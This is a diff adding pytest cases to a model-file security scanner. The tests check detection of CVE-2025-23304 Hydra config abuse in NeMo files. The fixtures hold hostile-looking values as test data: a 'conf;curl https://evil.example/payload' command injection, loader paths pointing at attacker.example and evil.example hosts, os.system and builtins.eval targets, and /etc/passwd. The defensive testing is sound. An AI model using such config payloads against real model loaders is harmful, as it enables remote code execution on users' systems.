@@ -4349,6 +4349,10 @@ class TestCVE202523304HydraTarget:
         [
             "hydra.compose",
             "hydra.compose.compose",
+            "hydra.experimental.compose",
+            "hydra.experimental.initialize",
+            "hydra.experimental.initialize_config_dir",
+            "hydra.experimental.initialize_config_module",
             "hydra.initialize",
             "hydra.initialize.initialize",
             "hydra.initialize.initialize_config_dir",
@@ -4483,6 +4487,327 @@ class TestCVE202523304HydraTarget:
             and check.details.get("target") == target
             for check in result.checks
         )
+
+    @pytest.mark.parametrize(
+        ("target", "target_config", "expected_argument", "expected_reason"),
+        [
+            (
+                "hydra.utils.call",
+                {"_target_": "hydra.utils.call", "config": "${payload}"},
+                "model.config",
+                "interpolated_helper_argument",
+            ),
+            (
+                "hydra.utils.instantiate",
+                {"_target_": "hydra.utils.instantiate", "_args_": ["${payload}"]},
+                "model._args_[0]",
+                "interpolated_helper_argument",
+            ),
+            (
+                "hydra.utils.instantiate",
+                {"_target_": "hydra.utils.instantiate", "_args_": ["literal", "${payload}"]},
+                "model._args_[1]",
+                "interpolated_helper_argument",
+            ),
+            (
+                "hydra.utils.instantiate",
+                {"_target_": "hydra.utils.instantiate", "config": [{"value": "${oc.env:PAYLOAD}"}]},
+                "model.config[0].value",
+                "interpolated_helper_argument",
+            ),
+            (
+                "nemo.collections.asr.models.EncDecCTCModel.restore_from",
+                {
+                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.restore_from",
+                    "restore_path": "/tmp/model.ckpt",
+                },
+                "model.restore_path",
+                "absolute_model_load_path",
+            ),
+            (
+                "nemo.collections.asr.models.EncDecCTCModel.load_from_checkpoint",
+                {
+                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.load_from_checkpoint",
+                    "checkpoint_path": "../model.ckpt",
+                },
+                "model.checkpoint_path",
+                "traversal_model_load_path",
+            ),
+            (
+                "nemo.collections.asr.models.EncDecCTCModel.restore_from",
+                {
+                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.restore_from",
+                    "override_config_path": "file:///etc/nemo.yaml",
+                },
+                "model.override_config_path",
+                "remote_model_load_path",
+            ),
+            (
+                "nemo.collections.asr.models.EncDecCTCModel.restore_from",
+                {
+                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.restore_from",
+                    "restore_path": "msc://attacker.example/model.nemo",
+                },
+                "model.restore_path",
+                "remote_model_load_path",
+            ),
+            (
+                "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
+                {
+                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
+                    "model_name": "/tmp/evil.nemo",
+                },
+                "model.model_name",
+                "absolute_model_load_path",
+            ),
+            (
+                "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
+                {
+                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
+                    "override_config_path": "s3://attacker.example/config.yaml",
+                },
+                "model.override_config_path",
+                "remote_model_load_path",
+            ),
+            (
+                "pytorch_lightning.LightningModule.load_from_checkpoint",
+                {
+                    "_target_": "pytorch_lightning.LightningModule.load_from_checkpoint",
+                    "hparams_file": "s3://attacker.example/hparams.yaml",
+                },
+                "model.hparams_file",
+                "remote_model_load_path",
+            ),
+            (
+                "nemo.collections.asr.models.EncDecCTCModel.restore_from",
+                {
+                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.restore_from",
+                    "_args_": ["checkpoints/model.nemo", "s3://attacker.example/config.yaml"],
+                },
+                "model._args_[1]",
+                "remote_model_load_path",
+            ),
+        ],
+    )
+    def test_safe_prefixed_hydra_helper_arguments_with_dangerous_paths_are_cve(
+        self,
+        tmp_path: Path,
+        target: str,
+        target_config: dict[str, Any],
+        expected_argument: str,
+        expected_reason: str,
+    ) -> None:
+        """Safe-prefixed helpers must inspect model-controlled config and loader arguments."""
+        path = _create_nemo_file(tmp_path, {"model": target_config})
+
+        result = NemoScanner().scan(str(path))
+
+        checks = [check for check in result.checks if check.name == "CVE-2025-23304: Dangerous Hydra helper argument"]
+        assert len(checks) == 1
+        check = checks[0]
+        assert check.status == CheckStatus.FAILED
+        assert check.severity == IssueSeverity.CRITICAL
+        assert check.details["target"] == target
+        assert check.details["argument"] == expected_argument
+        assert check.details["reason"] == expected_reason
+        assert check.details["cve_id"] == "CVE-2025-23304"
+        assert not any(
+            candidate.name == "Hydra _target_ Safety Check" and candidate.details.get("target") == target
+            for candidate in result.checks
+        )
+
+    @pytest.mark.parametrize(
+        ("target", "target_config"),
+        [
+            (
+                "hydra.utils.call",
+                {"_target_": "hydra.utils.call", "path": "os.system", "command": "id"},
+            ),
+            (
+                "hydra.utils.instantiate",
+                {"_target_": "hydra.utils.instantiate", "_args_": ["builtins.eval"]},
+            ),
+            (
+                "hydra.utils.instantiate",
+                {"_target_": "hydra.utils.instantiate", "_args_": ["literal", {"value": "still literal"}]},
+            ),
+            (
+                "hydra.utils.to_absolute_path",
+                {"_target_": "hydra.utils.to_absolute_path", "path": "/etc/passwd"},
+            ),
+            (
+                "omegaconf.OmegaConf.merge",
+                {"_target_": "omegaconf.OmegaConf.merge", "config": "conf;curl https://evil.example/payload"},
+            ),
+            (
+                "nemo.collections.asr.models.EncDecCTCModel.restore_from",
+                {
+                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.restore_from",
+                    "restore_path": "checkpoints/model.ckpt",
+                    "metadata": {"path": "../../inert.txt", "name": "os.system"},
+                },
+            ),
+            (
+                "nemo.collections.asr.models.EncDecCTCModel.restore_from",
+                {
+                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.restore_from",
+                    "restore_path": "models/../checkpoints/model.ckpt",
+                    "model_path": "../../inert-model-path",
+                    "RESTORE_PATH": "../inert-uppercase-key",
+                    "restore-path": "../inert-hyphen-key",
+                },
+            ),
+            (
+                "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
+                {
+                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
+                    "model_name": "stt_en_conformer_ctc_small",
+                    "override_config_path": "configs/model.yaml",
+                    "pretrained_model_name_or_path": "organization/model",
+                },
+            ),
+            (
+                "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
+                {
+                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
+                    "_args_": ["organization/model", "configs/model.yaml", "cuda"],
+                },
+            ),
+        ],
+    )
+    def test_safe_prefixed_hydra_helper_argument_near_matches_remain_safe(
+        self,
+        tmp_path: Path,
+        target: str,
+        target_config: dict[str, Any],
+    ) -> None:
+        """Inert helper data and API-required paths should not become CVE findings."""
+        path = _create_nemo_file(tmp_path, {"model": target_config})
+
+        result = NemoScanner().scan(str(path))
+
+        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra helper argument" for check in result.checks)
+        assert any(
+            check.name == "Hydra _target_ Safety Check"
+            and check.status == CheckStatus.PASSED
+            and check.details.get("target") == target
+            for check in result.checks
+        )
+
+    def test_nested_dangerous_target_under_hydra_helper_remains_detected(self, tmp_path: Path) -> None:
+        """Nested configs remain covered by normal recursive _target_ traversal."""
+        target = "os.system"
+        path = _create_nemo_file(
+            tmp_path,
+            {
+                "model": {
+                    "_target_": "hydra.utils.instantiate",
+                    "config": {"_target_": target, "command": "id"},
+                }
+            },
+        )
+
+        result = NemoScanner().scan(str(path))
+
+        assert any(
+            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
+            and check.severity == IssueSeverity.CRITICAL
+            and check.details.get("target") == target
+            for check in result.checks
+        )
+        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra helper argument" for check in result.checks)
+
+    def test_dynamic_helper_config_scan_limit_fails_closed(self, tmp_path: Path) -> None:
+        """Oversized helper configs must not silently hide late interpolations."""
+        target = "hydra.utils.instantiate"
+        config = {f"value_{index}": "safe" for index in range(1025)}
+        path = _create_nemo_file(
+            tmp_path,
+            {"model": {"_target_": target, "config": config}},
+        )
+
+        result = NemoScanner().scan(str(path))
+
+        checks = [check for check in result.checks if check.name == "CVE-2025-23304: Dangerous Hydra helper argument"]
+        assert len(checks) == 1
+        assert checks[0].details["target"] == target
+        assert checks[0].details["reason"] == "helper_config_scan_limit"
+
+    def test_dynamic_helper_positional_scan_limit_fails_closed(self, tmp_path: Path) -> None:
+        """Oversized helper positional inputs must not hide a dangerous tail."""
+        target = "hydra.utils.instantiate"
+        path = _create_nemo_file(
+            tmp_path,
+            {"model": {"_target_": target, "_args_": ["literal"] * 1025}},
+        )
+
+        result = NemoScanner().scan(str(path))
+
+        checks = [check for check in result.checks if check.name == "CVE-2025-23304: Dangerous Hydra helper argument"]
+        assert len(checks) == 1
+        assert checks[0].details["target"] == target
+        assert checks[0].details["reason"] == "helper_config_scan_limit"
+
+    def test_model_loader_positional_scan_limit_fails_closed(self, tmp_path: Path) -> None:
+        """Oversized positional loader inputs must not hide a dangerous tail."""
+        target = "nemo.collections.asr.models.EncDecCTCModel.restore_from"
+        path = _create_nemo_file(
+            tmp_path,
+            {
+                "model": {
+                    "_target_": target,
+                    "_args_": ["checkpoints/model.nemo"] * 1025,
+                }
+            },
+        )
+
+        result = NemoScanner().scan(str(path))
+
+        checks = [check for check in result.checks if check.name == "CVE-2025-23304: Dangerous Hydra helper argument"]
+        assert len(checks) == 1
+        assert checks[0].details["target"] == target
+        assert checks[0].details["reason"] == "helper_config_scan_limit"
+
+    @pytest.mark.parametrize(
+        "checkpoint_path",
+        [
+            "https://evil.example/payload.ckpt",
+            "file:///etc/passwd",
+            "s3://attacker.example/payload.ckpt",
+        ],
+    )
+    def test_model_loader_remote_checkpoint_uri_is_cve(self, tmp_path: Path, checkpoint_path: str) -> None:
+        """Remote checkpoint loaders must not bypass safe target-prefix handling."""
+        target = "pytorch_lightning.LightningModule.load_from_checkpoint"
+        path = _create_nemo_file(
+            tmp_path,
+            {"model": {"_target_": target, "checkpoint_path": checkpoint_path}},
+        )
+
+        result = NemoScanner().scan(str(path))
+
+        checks = [check for check in result.checks if check.name == "CVE-2025-23304: Dangerous Hydra helper argument"]
+        assert len(checks) == 1
+        assert checks[0].details["target"] == target
+        assert checks[0].details["reason"] == "remote_model_load_path"
+
+    def test_model_loader_absolute_path_fails_aggregate_scan(self, tmp_path: Path) -> None:
+        """Host-path model loads must retain security exit-code precedence."""
+        target = "nemo.collections.asr.models.EncDecCTCModel.restore_from"
+        path = _create_nemo_file(
+            tmp_path,
+            {"model": {"_target_": target, "restore_path": "/tmp/model.ckpt"}},
+        )
+
+        result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})
+
+        assert any(
+            issue.severity == IssueSeverity.CRITICAL
+            and issue.details.get("target") == target
+            and issue.details.get("reason") == "absolute_model_load_path"
+            for issue in result.issues
+        )
+        assert determine_exit_code(result) == 1
 
     @pytest.mark.parametrize(
         "target",
